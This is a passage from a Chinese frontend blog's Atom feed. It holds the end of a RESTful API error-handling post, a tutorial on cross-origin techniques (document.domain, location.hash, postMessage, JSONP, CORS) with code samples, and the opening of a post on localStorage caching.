<li>格式错误 (FORMAT_INVALID)</li>
<li>数据不存在 (DATA_NOT_FOUND)</li>
<li>数据已存在 (DATA_EXISTED)</li>
<li>数据无效 (DATA_INVALID)</li>
<li>登录错误 (LOGIN_REQUIRED)</li>
<li>权限不足 (PERMISSION_DENIED)</li>
</ul>
<p>错误分类之后，我们抛错误的时候就变得更加直观了：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!res.body.title) &#123;</div><div class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(ERROR.FORMAT_INVALID)</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!user) &#123;</div><div class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(ERROR.LOGIN_REQUIRED)</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!post) &#123;</div><div class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(ERROR.DATA_NOT_FOUND)</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (post.creator.id !== user.id) &#123;</div><div class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(ERROR.PERMISSION_DENIED)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载：&lt;a href=&quot;http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/&quot;&gt;http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Restful API这个概念是我这几天看博客才接触到的，但其实在日常开发中这个思想始终都占据着重要地位。&lt;/p&gt;
&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;随着移动开发和前端开发的崛起，越来越多的 Web 后端应用都倾向于实现 Restful API。&lt;br&gt;Restful API 是一个简单易用的前后端分离方案，它只需要对客户端请求进行处理，然后返回结果即可， 无需考虑页面渲染，一定程度上减轻了后端开发人员的负担。&lt;br&gt;不过，这也意味着，有一些工作就必须由前端来完成了，比如错误处理。&lt;/p&gt;
&lt;p&gt;当 Restful API 需要抛出错误的时候，我们要考虑的是：这个错误应该包含哪些信息。&lt;br&gt;我们先看看 Github, Google, Facebook, Twitter, Twilio 的错误信息是怎样的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="后端" scheme="https://ganchengyuan1990.github.io/blog/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>跨域问题整理</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/23/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/23/跨域问题整理/</id>
    <published>2017-01-23T01:22:43.000Z</published>
    <updated>2017-02-07T01:26:19.715Z</updated>
    
    <content type="html"><![CDATA[<p>跨域，是一个前端开发者必须掌握的概念，这篇文章就从几个基本问题出发，来理解这个概念。</p>
<h3 id="首先，什么是跨域？为何会有跨域？"><a href="#首先，什么是跨域？为何会有跨域？" class="headerlink" title="首先，什么是跨域？为何会有跨域？"></a>首先，什么是跨域？为何会有跨域？</h3><p>跨域一词从字面意思看，就是跨域名嘛，但实际上跨域的范围绝对不止那么狭隘。具体概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域。所以说，如果你的后端用的是NODEJS，然后端口设置采用了默认的3000，还是会产生跨域的。之所以会产生跨域这个问题呢，其实也很容易想明白，要是随便引用外部文件，不同标签下的页面引用类似的彼此的文件，浏览器很容易懵逼的，安全也得不到保障了就。什么事，都是安全第一嘛。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象（iframe之间）。下面是具体的跨域情况详解：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">URL                      <span class="comment">//说明       是否允许通信</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js     //同一域名下   允许</span></div><div class="line">http:<span class="comment">//www.a.com/lab/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/script/b.js //同一域名下不同文件夹 允许</span></div><div class="line">http:<span class="comment">//www.a.com:8000/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js     //同一域名，不同端口  不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">https:<span class="comment">//www.a.com/b.js //同一域名，不同协议 不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//70.32.92.74/b.js //域名和域名对应ip 不允许</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//script.a.com/b.js //主域相同，子域不同 不允许（cookie这种情况下也不允许访问）</span></div><div class="line">http:<span class="comment">//www.a.com/a.js</span></div><div class="line">http:<span class="comment">//a.com/b.js //同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问）</span></div><div class="line">http:<span class="comment">//www.cnblogs.com/a.js</span></div><div class="line">http:<span class="comment">//www.a.com/b.js //不同域名 不允许</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="那么跨域方法有哪些呢？"><a href="#那么跨域方法有哪些呢？" class="headerlink" title="那么跨域方法有哪些呢？"></a>那么跨域方法有哪些呢？</h3><p>既然有跨域这种限制，我们要怎么绕过它呢？</p>
<h2 id="1-通过document-domain跨域"><a href="#1-通过document-domain跨域" class="headerlink" title="1. 通过document.domain跨域"></a>1. 通过document.domain跨域</h2><p>前面说过了，浏览器有一个同源策略，其限制之一是不能通过ajax的方法去请求不同源中的文档。 第二个限制是浏览器中不同域的框架之间是不能进行js的交互操作的。不同的框架之间是可以获取window对象的，但却无法获取相应的属性和方法。比如，有一个页面，它的地址是<a href="http://www.damonare.cn/a.html" target="_blank" rel="external">http://www.damonare.cn/a.html</a> ， 在这个页面里面有一个iframe，它的src是<a href="http://damonare.cn/b.html" target="_blank" rel="external">http://damonare.cn/b.html</a>, 很显然，这个页面与它里面的iframe框架是不同域的，所以我们是无法通过在页面中书写js代码来获取iframe中的东西的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</div><div class="line">        <span class="keyword">var</span> win = iframe.contentWindow;<span class="comment">//可以获取到iframe里的window对象，但该window对象的属性和方法几乎是不可用的</span></div><div class="line">        <span class="keyword">var</span> doc = win.document;<span class="comment">//这里获取不到iframe里的document对象</span></div><div class="line">        <span class="keyword">var</span> name = win.name;<span class="comment">//这里同样获取不到window对象的name属性</span></div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://damonare.cn/b.html"</span> <span class="attr">onload</span> = <span class="string">"test()"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这个时候，document.domain就可以派上用场了，<font color="blue">我们只要把<a href="http://www.damonare.cn/a.html和http://damonare.cn/b.html这两个页面的document.domain都设成相同的域名就可以了。但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。" target="_blank" rel="external">http://www.damonare.cn/a.html和http://damonare.cn/b.html这两个页面的document.domain都设成相同的域名就可以了。但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。</a></font></p>
<ul>
<li>在页面<a href="http://www.damonare.cn/a.html" target="_blank" rel="external">http://www.damonare.cn/a.html</a> 中设置document.domain:</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://damonare.cn/b.html"</span> <span class="attr">onload</span> = <span class="string">"test()"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="built_in">document</span>.domain = <span class="string">'damonare.cn'</span>;<span class="comment">//设置成主域</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(<span class="built_in">document</span>.getElementById(<span class="string">'￼iframe'</span>).contentWindow);<span class="comment">//contentWindow 可取得子窗口的 window 对象</span></div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在页面<a href="http://damonare.cn/b.html" target="_blank" rel="external">http://damonare.cn/b.html</a> 中也设置document.domain:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="built_in">document</span>.domain = <span class="string">'damonare.cn'</span>;<span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<font color="red">修改document.domain的方法只适用于不同子域的框架间的交互。</font>

<h3 id="2-通过location-hash跨域"><a href="#2-通过location-hash跨域" class="headerlink" title="2. 通过location.hash跨域"></a>2. 通过location.hash跨域</h3><p>因为父窗口可以对iframe进行URL读写，iframe也可以读写父窗口的URL，URL有一部分被称为hash，就是#号及其后面的字符，它一般用于浏览器锚点定位，Server端并不关心这部分，应该说HTTP请求过程中不会携带hash，所以这部分的修改不会产生HTTP请求，但是会产生浏览器历史记录。此方法的原理就是改变URL的hash部分来进行双向通信。每个window通过改变其他 window的location来发送消息（由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe），并通过监听自己的URL的变化来接收消息。这个方式的通信会造成一些不必要的浏览器历史记录，而且有些浏览器不支持onhashchange事件，需要轮询来获知URL的改变，最后，这样做也存在缺点，诸如数据直接暴露在了url中，数据容量和类型都有限等。下面举例说明：</p>
<p>假如父页面是baidu.com/a.html,iframe嵌入的页面为google.cob.html（此处省略了域名等url属性），要实现此两个页面间的通信可以通过以下方法。</p>
<ul>
<li><p>a.html传送数据到b.html<br><strong> a.html下修改iframe的src为google.com/b.html#paco
</strong> b.html监听到url发生变化，触发相应操作</p>
</li>
<li><p>b.html传送数据到a.html，由于两个页面不在同一个域下IE、Chrome不允许修改parent.location.hash的值，所以要借助于父窗口域名下的一个代理iframe<br><strong> b.html下创建一个隐藏的iframe，此iframe的src是baidu.com域下的，并挂上要传送的hash数据，如src=”<a href="http://www.baidu.com/proxy.html#data" target="_blank" rel="external">http://www.baidu.com/proxy.html#data</a>“
</strong> proxy.html监听到url发生变化，修改a.html的url（因为a.html和proxy.html同域，所以proxy.html可修改a.html的url hash）<br>** a.html监听到url发生变化，触发相应操作</p>
</li>
</ul>
<p>b.html关键代码是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;  </div><div class="line">    parent.location.hash = <span class="string">'data'</span>;  </div><div class="line">&#125; <span class="keyword">catch</span> (e) &#123;  </div><div class="line">    <span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，  </span></div><div class="line">    <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);  </div><div class="line">    ifrproxy.style.display = <span class="string">'none'</span>;  </div><div class="line">    ifrproxy.src = <span class="string">"http://www.baidu.com/proxy.html#data"</span>;  </div><div class="line">    <span class="built_in">document</span>.body.appendChild(ifrproxy);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>总的来说，这两个方法都是非常hacky的，所以目前来说广泛应用的场景非常少。重点是下面三种方式</p>
<h3 id="3-通过HTML5的postMessage方法跨域"><a href="#3-通过HTML5的postMessage方法跨域" class="headerlink" title="3. 通过HTML5的postMessage方法跨域"></a>3. 通过HTML5的postMessage方法跨域</h3><p>高级浏览器Internet Explorer 8+, chrome，Firefox , Opera 和 Safari 都将支持这个功能。这个功能主要包括接受信息的”message”事件和发送消息的”postMessage”方法。比如damonare.cn域的A页面通过iframe嵌入了一个google.com域的B页面，可以通过以下方法实现A和B的通信。</p>
<p>A页面通过postMessage方法发送消息：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </div><div class="line">    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);  </div><div class="line">    <span class="keyword">var</span> targetOrigin = <span class="string">"http://www.google.com"</span>;  </div><div class="line">    ifr.contentWindow.postMessage(<span class="string">'hello world!'</span>, targetOrigin);  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>B页面通过message事件监听并接受消息:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;  </div><div class="line">  <span class="keyword">var</span> data = event.data;<span class="comment">//消息  </span></div><div class="line">  <span class="keyword">var</span> origin = event.origin;<span class="comment">//消息来源地址  </span></div><div class="line">  <span class="keyword">var</span> source = event.source;<span class="comment">//源Window对象  </span></div><div class="line">  <span class="keyword">if</span>(origin==<span class="string">"http://www.baidu.com"</span>)&#123;  </div><div class="line">	<span class="built_in">console</span>.log(data);<span class="comment">//hello world!  </span></div><div class="line">  &#125;  </div><div class="line">&#125;;  </div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.addEventListener != <span class="string">'undefined'</span>) &#123;  </div><div class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, onmessage, <span class="literal">false</span>);  </div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.attachEvent != <span class="string">'undefined'</span>) &#123;  </div><div class="line">  <span class="comment">//for ie  </span></div><div class="line">  <span class="built_in">window</span>.attachEvent(<span class="string">'onmessage'</span>, onmessage);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此方案也得建立一个隐藏的iframe，并且H5的兼容性也是一个问题，移动端可以尝试。</p>
<h3 id="4-JSONP方法跨域"><a href="#4-JSONP方法跨域" class="headerlink" title="4. JSONP方法跨域"></a>4. JSONP方法跨域</h3><p>刚才说的这几种都是双向通信的，即两个iframe，页面与iframe或是页面与页面之间的，下面说几种单项跨域的（一般用来获取数据），因为通过script标签引入的js是不受同源策略的限制的。所以我们可以通过script标签引入一个js或者是一个其他后缀形式（如php，jsp等）的文件，此文件返回一个js函数的调用。<br>比如，有个a.html页面，它里面的代码需要利用ajax获取一个不同域上的json数据，假设这个json数据地址是<a href="http://damonare.cn/data.php,那么a.html中的代码就可以这样：" target="_blank" rel="external">http://damonare.cn/data.php,那么a.html中的代码就可以这样：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$callback = $_GET[<span class="string">'callback'</span>];<span class="comment">//得到回调函数名</span></div><div class="line">$data = <span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);<span class="comment">//要返回的数据</span></div><div class="line"><span class="keyword">echo</span> $callback.<span class="string">'('</span>.json_encode($data).<span class="string">')'</span>;<span class="comment">//输出</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>jquery会自动生成一个全局函数来替换callback=?中的问号，之后获取到数据后又会自动销毁，实际上就是起一个临时代理函数的作用。$.getJSON方法会自动判断是否跨域，不跨域的话，就调用普通的ajax方法；跨域的话，则会以异步加载js文件的形式来调用jsonp的回调函数。</p>
<p>JSONP的优缺点:</p>
<ul>
<li>JSONP的优点是：它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。</li>
<li>JSONP的缺点则是：它只支持GET请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。</li>
</ul>
<h3 id="5-通过CORS跨域"><a href="#5-通过CORS跨域" class="headerlink" title="5. 通过CORS跨域"></a>5. 通过CORS跨域</h3><p>CORS（Cross-Origin Resource Sharing）跨域资源共享，定义了必须在访问跨域资源时，浏览器与服务器应该如何沟通。CORS背后的基本思想就是使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功还是失败。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>一言不合上代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    xhr.open(<span class="string">"￼GET"</span>, <span class="string">"http://segmentfault.com/u/trigkit4/"</span>,<span class="literal">true</span>);</div><div class="line">    xhr.send();</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来实现的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。</p>
<p>相比于JSON，它有以下特点：</p>
<ol>
<li>JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。</li>
<li>使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。</li>
<li>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS）。</li>
</ol>
<p>CORS更类似于一个高级的协议，只要服务器端和客户端都遵照这个协议来，就可以进行通信。</p>
<p>这个方案的主要工作量在于服务器端的配置，浏览器不需要任何额外工作。</p>
<ol>
<li><p>在PHP文件中设置(亲测有效)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"> header(<span class="string">"Access-Control-Allow-Origin:*"</span>);  </div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>NodeJs配置(亲测有效)：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//To allow cross origin request</span></div><div class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  res.header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>);</div><div class="line">  res.header(<span class="string">'Access-Control-Allow-Headers'</span>, <span class="string">'Origin, X-Requested-With, Content-Type, Accept'</span>);</div><div class="line">  next();</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跨域，是一个前端开发者必须掌握的概念，这篇文章就从几个基本问题出发，来理解这个概念。&lt;/p&gt;
&lt;h3 id=&quot;首先，什么是跨域？为何会有跨域？&quot;&gt;&lt;a href=&quot;#首先，什么是跨域？为何会有跨域？&quot; class=&quot;headerlink&quot; title=&quot;首先，什么是跨域？为何会有跨域？&quot;&gt;&lt;/a&gt;首先，什么是跨域？为何会有跨域？&lt;/h3&gt;&lt;p&gt;跨域一词从字面意思看，就是跨域名嘛，但实际上跨域的范围绝对不止那么狭隘。具体概念如下：只要协议、域名、端口有任何一个不同，都被当作是不同的域。所以说，如果你的后端用的是NODEJS，然后端口设置采用了默认的3000，还是会产生跨域的。之所以会产生跨域这个问题呢，其实也很容易想明白，要是随便引用外部文件，不同标签下的页面引用类似的彼此的文件，浏览器很容易懵逼的，安全也得不到保障了就。什么事，都是安全第一嘛。但在安全限制的同时也给注入iframe或是ajax应用上带来了不少麻烦。所以我们要通过一些方法使本域的js能够操作其他域的页面对象或者使其他域的js能操作本域的页面对象（iframe之间）。下面是具体的跨域情况详解：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;URL                      &lt;span class=&quot;comment&quot;&gt;//说明       是否允许通信&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/b.js     //同一域名下   允许&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/lab/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/script/b.js //同一域名下不同文件夹 允许&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com:8000/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/b.js     //同一域名，不同端口  不允许&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;https:&lt;span class=&quot;comment&quot;&gt;//www.a.com/b.js //同一域名，不同协议 不允许&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//70.32.92.74/b.js //域名和域名对应ip 不允许&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//script.a.com/b.js //主域相同，子域不同 不允许（cookie这种情况下也不允许访问）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//a.com/b.js //同一域名，不同二级域名（同上） 不允许（cookie这种情况下也不允许访问）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.cnblogs.com/a.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http:&lt;span class=&quot;comment&quot;&gt;//www.a.com/b.js //不同域名 不允许&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>localStorage缓存机制</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/22/localStorage%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/22/localStorage缓存机制/</id>
    <published>2017-01-22T01:26:17.000Z</published>
    <updated>2017-02-04T01:44:29.786Z</updated>
    
    <content type="html"><![CDATA[<p>首先，localStorage的确是可以做JS以及CSS缓存的，详情可以通过F12看<a href="http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735610010&amp;idx=1&amp;sn=67e3f0833f1097a279d850e2098956ff&amp;scene=0#wechat_redirect" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzA5NDIzNzY1OQ==&amp;mid=2735610010&amp;idx=1&amp;sn=67e3f0833f1097a279d850e2098956ff&amp;scene=0#wechat_redirect</a></p>
<p>按道理说这个机制是非常诱人的，毕竟localStorage可存储体积大，并且用户一旦开启便不容易清除，所以从工程师的角度来看这个工具非常适合缓存一些并不经常需要维护更新的脚本和样式文件。</p>
<p>当然，假如要更新的话，就得好好设计一下更新机制，普通的资源请求，可以根据文件名+md5 <a href="http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。" target="_blank" rel="external">http://res.wx.qq.com/mmbizwap/zh_CN/htmledition/js/biz_wap/moon32ebc4.js或者在资源链接后面加上特定的后缀http://1.ss.faisys.com/js/comm/fai.min.js?v=201612051739做标识来判断是否需要更新资源。如果用localStorage做，则需要一套新的缓存更新机制。</a></p>
<p>微信的做法是每个文件都单独维护一个localStorage变量，来记录版本号，从而由后台来判断是否需要更新。</p>
<a id="more"></a>
